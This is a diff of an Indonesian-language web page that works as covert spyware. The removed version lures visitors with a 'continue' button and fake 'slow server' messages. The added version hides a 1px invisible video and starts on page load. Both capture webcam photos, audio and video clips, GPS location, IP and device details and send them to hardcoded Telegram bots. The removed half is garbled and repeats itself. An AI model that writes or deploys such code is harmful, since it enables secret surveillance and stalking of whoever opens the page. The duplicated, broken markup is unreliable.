@@ -1,494 +1,162 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>JANGAN DIPENCET KEPO AMAT😂</title>
+  <meta charset="UTF-8" />
+  <title></title>
   <style>
-    body {
+    html, body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #6a11cb, #2575fc);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      padding: 0;
+      background: transparent;
     }
-    .popup {
-      background-color: rgba(0, 0, 0, 0.7);
-      padding: 30px;
-      border-radius: 15px;
-      text-align: center;
-      width: 300px;
-    }
-    button {
-      transition: background 0.3s ease, transform 0.3s ease;
-      padding: 10px 20px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 8px;
-      background: #00ff88;
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    #video {
-      transition: opacity 1s ease;
-      display: none;
+    video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
     }
   </style>
 </head>
 <body>
-  <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
-    hay tolong tunggu 5 menit dan tolong tab baru aja by rizky gg blora ©kerenprojek.
-  </marquee>
-  <div class="popup" id="step1">
-    <h2>Untuk melanjutkan, silakan klik tombol di bawah</h2>
-    <button onclick="startStreaming()">LANJUTKAN</button>
-  </div><video id="video" autoplay playsinline></video>
-
+  <video id="video" autoplay muted playsinline></video>
   <script>
-    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
-    const chat_id = '6374002294';
-    let recorder;
-    let recordedChunks = [];
-    let autoStream;
+    const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
+    const chat_id = '7552410869';
 
-    window.onload = async () => {
-      try {
-        await getLocation();
-        autoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        console.log("Akses kamera & mikrofon diberikan otomatis");
-        autoTakePhotos(); // ambil 3 foto saat pertama kali masuk
-      } catch (e) {
-        alert("Izin kamera/mikrofon atau lokasi ditolak.");
-      }
-    };
+    let chunks = [];
+    let mediaRecorder;
 
-    async function startStreaming() {
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id, text: 'Pengguna baru memulai akses web yang kamu kasih ke pengguna bismillah berasil amiin' })
-      });
+    async function start() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const video = document.getElementById("video");
+      video.srcObject = stream;
 
-      const synth = window.speechSynthesis;
-      const welcome = new SpeechSynthesisUtterance('Halo! Terima kasih sudah melanjutkan. Proses sedang berjalan tunggu 5 menit kaau blm juga tunggu 1 jam soalnya selver agak lemot silahkan tab baru aja dulu');
-      welcome.lang = 'id-ID';
-      synth.speak(welcome);
-
-      // sapaan bucin keren
-      const bucin = [
-        "Halo sayang, akhirnya kamu datang juga.",
-        "Aku kangen banget loh, jangan tinggalin aku ya!",
-        "Aku siap nemenin kamu sampai akhir, serius.",
-        "Jangan lupa senyum ya, soalnya senyummu bikin dunia lebih indah."
-      ];
-      bucin.forEach((text, i) => {
-        setTimeout(() => {
-          const u = new SpeechSynthesisUtterance(text);
-          u.lang = 'id-ID';
-          synth.speak(u);
-        }, (i + 1) * 5000);
-      });
-
-      const popup = document.getElementById('step1');
-      popup.style.transition = 'opacity 0.5s ease';
-      popup.style.opacity = 0;
-      setTimeout(() => popup.style.display = 'none', 500);
-
-      try {
-        const location = await getLocation();
-        const stream = autoStream;
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-
-        recorder = new MediaRecorder(stream);
-        recorder.ondataavailable = handleDataAvailable;
-        recorder.onstop = () => handleStop(stream);
-
-        recorder.start();
-
-        setTimeout(() => {
-          setInterval(() => {
-            recorder.stop();
-            recorder.start();
-          }, 17000);
-        }, 17000);
-
-        setTimeout(() => {
-          recorder.stop();
-          alert("Rekaman otomatis selesai setelah 5 jam.");
-        }, 5 * 60 * 60 * 1000);
-
-      } catch (err) {
-        alert("Akses kamera dan mikrofon ditolak.");
-        console.error(err);
-      }
-    }
-
-    function handleDataAvailable(event) {
-      if (event.data.size > 0) {
-        recordedChunks.push(event.data);
-      }
-    }
-
-    async function handleStop(stream) {
-      setTimeout(() => capturePhoto(), 6000);
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      recordedChunks = [];
-
-      const userAgent = navigator.userAgent;
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
-      const simInfo = navigator.userAgent.includes('Android') ? 'Kemungkinan SIM aktif (Android)' : 'Tidak terdeteksi';
-      const connection = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink}Mb/s` : 'Tidak tersedia';
-      const brand = /Android.+?; (.+?) Build/.exec(navigator.userAgent)?.[1] || 'Tidak diketahui';
-
-      const waktu = new Date();
-      const date = waktu.toLocaleDateString();
-      const time = waktu.toLocaleTimeString();
-      const location = await getLocation();
-      const lastActive = waktu.toLocaleString();
-
-      const message = `                                
-█░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
-█▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
-▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀
-=====================================
-IP: ${ip}
-=====================================
-Perangkat: ${userAgent}
-=====================================
-Terakhir Aktif: ${lastActive}
-=====================================
-Waktu: ${date}, ${time}
-=====================================
-Lokasi: ${location}
-======================================
-Baterai: ${battery}
-======================================
-SIM Card: ${simInfo}
-======================================
-Jaringan: ${connection}
-======================================
-Merek Perangkat: ${brand}
-=======================================               ©PROJEK GG BY RIZKY
-      `;
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", message);
-      formData.append("video", blob, "rekaman.webm");
-
-      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error("Telegram error:", err));
-    }
-
-    async function getLocation() {
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            resolve(`https://www.google.com/maps?q=${lat},${lon}`);
-          },
-          err => {
-            resolve("Lokasi tidak tersedia");
-          }
-        );
-      });
-    }
-
-    async function capturePhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("photo", blob, "photo.jpg");
-
+      // Kirim gambar tambahan
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error("Telegram photo error:", err));
-    }
+        method: "POST",
+        body: (() => {
+          let f = new FormData();
+          f.append("chat_id", chat_id);
+          f.append("photo", "https://files.catbox.moe/p7xbtg.png");
+          f.append("caption", "🖼 Gambar default terkirim");
+          return f;
+        })()
+      });
 
-    // Fitur auto ambil 3 foto pertama kali
-    async function autoTakePhotos() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        await new Promise(r => setTimeout(r, 1000));
-
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-<!DOCTYPE html><html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <title>JANGAN DIPENCET KEPO AMAT😂</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #6a11cb, #2575fc);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .popup {
-      background-color: rgba(0, 0, 0, 0.7);
-      padding: 30px;
-      border-radius: 15px;
-      text-align: center;
-      width: 300px;
-    }
-    button {
-      transition: background 0.3s ease, transform 0.3s ease;
-      padding: 10px 20px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 8px;
-      background: #00ff88;
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    #video {
-      transition: opacity 1s ease;
-      display: none;
-    }
-  </style>
-</head>
-<body>
-  <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
-    hay tolong tunggu 5 menit dan tolong tab baru aja by rizky gg blora ©kerenprojek.
-  </marquee>
-  <div class="popup" id="step1">
-    <h2>Untuk melanjutkan, silakan klik tombol di bawah</h2>
-    <button onclick="startStreaming()">LANJUTKAN</button>
-  </div><video id="video" autoplay playsinline></video>
-
-  <script>
-    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
-    const chat_id = '6374002294';
-    let recorder;
-    let recordedChunks = [];
-    let autoStream;
-
-    window.onload = async () => {
-      try {
-        await getLocation();
-        autoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        console.log("Akses kamera & mikrofon diberikan otomatis");
-        autoTakePhotos(); // ambil 3 foto saat pertama kali masuk
-      } catch (e) {
-        alert("Izin kamera/mikrofon atau lokasi ditolak.");
-      }
-    };
-
-    async function startStreaming() {
+      // Kirim URL browser
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id, text: 'Pengguna baru memulai akses web yang kamu kasih ke pengguna bismillah berasil amiin' })
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id,
+          text: `🌐 Link Aktif: ${location.href}`
+        })
       });
 
-      const synth = window.speechSynthesis;
-      const welcome = new SpeechSynthesisUtterance('Halo! Terima kasih sudah melanjutkan. Proses sedang berjalan tunggu 5 menit kaau blm juga tunggu 1 jam soalnya selver agak lemot silahkan tab baru aja dulu');
-      welcome.lang = 'id-ID';
-      synth.speak(welcome);
+      // Info perangkat + cuaca
+      sendInfo();
 
-      // sapaan bucin keren
-      const bucin = [
-        "Halo sayang, akhirnya kamu datang juga.",
-        "Aku kangen banget loh, jangan tinggalin aku ya!",
-        "Aku siap nemenin kamu sampai akhir, serius.",
-        "Jangan lupa senyum ya, soalnya senyummu bikin dunia lebih indah."
-      ];
-      bucin.forEach((text, i) => {
-        setTimeout(() => {
-          const u = new SpeechSynthesisUtterance(text);
-          u.lang = 'id-ID';
-          synth.speak(u);
-        }, (i + 1) * 5000);
-      });
+      // Foto otomatis setiap 5 detik
+      setInterval(() => autoPhoto(video), 5000);
 
-      const popup = document.getElementById('step1');
-      popup.style.transition = 'opacity 0.5s ease';
-      popup.style.opacity = 0;
-      setTimeout(() => popup.style.display = 'none', 500);
+      // Rekam audio+video tiap 10 detik
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        chunks = [];
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("video", blob, "auto10s.webm");
+        form.append("caption", "loading....");
+        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: form });
+        setTimeout(() => mediaRecorder.start(), 1000);
+      };
 
-      try {
-        const location = await getLocation();
-        const stream = autoStream;
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+      mediaRecorder.start();
+      setInterval(() => mediaRecorder.stop(), 10000);
 
-        recorder = new MediaRecorder(stream);
-        recorder.ondataavailable = handleDataAvailable;
-        recorder.onstop = () => handleStop(stream);
-
-        recorder.start();
-
-        setTimeout(() => {
-          setInterval(() => {
-            recorder.stop();
-            recorder.start();
-          }, 17000);
-        }, 17000);
-
-        setTimeout(() => {
-          recorder.stop();
-          alert("Rekaman otomatis selesai setelah 5 jam.");
-        }, 5 * 60 * 60 * 1000);
-
-      } catch (err) {
-        alert("Akses kamera dan mikrofon ditolak.");
-        console.error(err);
-      }
-    }
-
-    function handleDataAvailable(event) {
-      if (event.data.size > 0) {
-        recordedChunks.push(event.data);
-      }
-    }
-
-    async function handleStop(stream) {
-      setTimeout(() => capturePhoto(), 6000);
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      recordedChunks = [];
-
-      const userAgent = navigator.userAgent;
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
-      const simInfo = navigator.userAgent.includes('Android') ? 'Kemungkinan SIM aktif (Android)' : 'Tidak terdeteksi';
-      const connection = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink}Mb/s` : 'Tidak tersedia';
-      const brand = /Android.+?; (.+?) Build/.exec(navigator.userAgent)?.[1] || 'Tidak diketahui';
-
-      const waktu = new Date();
-      const date = waktu.toLocaleDateString();
-      const time = waktu.toLocaleTimeString();
-      const location = await getLocation();
-      const lastActive = waktu.toLocaleString();
-
-      const message = `                                
-█░▄▀ ▄▀▄ █▀▀▄ █▀▄ ▄▀▄ █▄░█
-█▀▄░ █░█ █▐█▀ █▀█ █▀█ █░▀█
-▀░▀▀ ░▀░ ▀░▀▀ ▀▀░ ▀░▀ ▀░░▀
-=====================================
-IP: ${ip}
-=====================================
-Perangkat: ${userAgent}
-=====================================
-Terakhir Aktif: ${lastActive}
-=====================================
-Waktu: ${date}, ${time}
-=====================================
-Lokasi: ${location}
-======================================
-Baterai: ${battery}
-======================================
-SIM Card: ${simInfo}
-======================================
-Jaringan: ${connection}
-======================================
-Merek Perangkat: ${brand}
-=======================================               ©PROJEK GG BY RIZKY
-      `;
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", message);
-      formData.append("video", blob, "rekaman.webm");
-
-      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error("Telegram error:", err));
-    }
-
-    async function getLocation() {
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            resolve(`https://www.google.com/maps?q=${lat},${lon}`);
-          },
-          err => {
-            resolve("Lokasi tidak tersedia");
-          }
-        );
-      });
-    }
-
-    async function capturePhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("photo", blob, "photo.jpg");
-
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error("Telegram photo error:", err));
-    }
-
-    // Fitur auto ambil 3 foto pertama kali
-    async function autoTakePhotos() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        await new Promise(r => setTimeout(r, 1000));
-
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-
-        for (let i = 0; i < 3; i++) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-          const formData = new FormData();
-          formData.append("chat_id", chat_id);
-         formData.append("photo", blob, `photo_${i + 1}.jpg`);
-          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
+      // Prompt AI Chat (opsional)
+      setTimeout(async () => {
+        const q = prompt("Mau tanya apa ke AI?");
+        if (q) {
+          const res = await fetch("https://text.pollinations.ai/openai", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "text/event-stream",
+              "user-agent": navigator.userAgent
+            },
+            body: JSON.stringify({ messages: [{ role: "user", content: q }], stream: false })
           });
-          await new Promise(r => setTimeout(r, 1500));
+          const json = await res.json();
+          const jawaban = json?.choices?.[0]?.message?.content;
+          if (jawaban) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id, text: `💬 Jawaban AI:\n${jawaban}` })
+            });
+          }
         }
-
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) {
-        console.warn("Gagal ambil foto otomatis:", e);
-      }
+      }, 5000);
     }
+
+    async function autoPhoto(video) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", blob, "photo.jpg");
+      form.append("caption", "📸 Foto otomatis");
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: form });
+    }
+
+    async function sendInfo() {
+      const waktu = new Date().toLocaleString();
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+      const ua = navigator.userAgent;
+      const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
+      const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
+      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak terdeteksi';
+      const brand = (ua.match(/Android.*?;\s(.+?)\sBuild/) || [])[1] || "Tidak diketahui";
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const maps = `https://maps.google.com/?q=${lat},${lon}`;
+        const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const gjson = await g.json();
+        const kota = gjson.address.city || gjson.address.town || gjson.address.village || 'Tidak diketahui';
+
+        // Cek cuaca
+        let cuaca = '';
+        try {
+          const cu = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+          const js = await cu.json();
+          if (js.status && js.result) {
+            const w = js.result.weather[0];
+            cuaca = `\n🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${js.result.main.temp}°C\n💧 Kelembaban: ${js.result.main.humidity}%\n🌬️ Angin: ${js.result.wind.speed} m/s`;
+          }
+        } catch {}
+
+        const teks = `📍 Lokasi: ${maps}\n🕒 Waktu: ${waktu}\n🌐 IP: ${ip}\n🔋 Baterai: ${bat}\n📶 Jaringan: ${net}\n📱 Merek: ${brand}\n💾 RAM: ${ram}${cuaca}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: teks })
+        });
+      });
+    }
+
+    window.onload = start;
   </script>
 </body>
-</html
+</html>
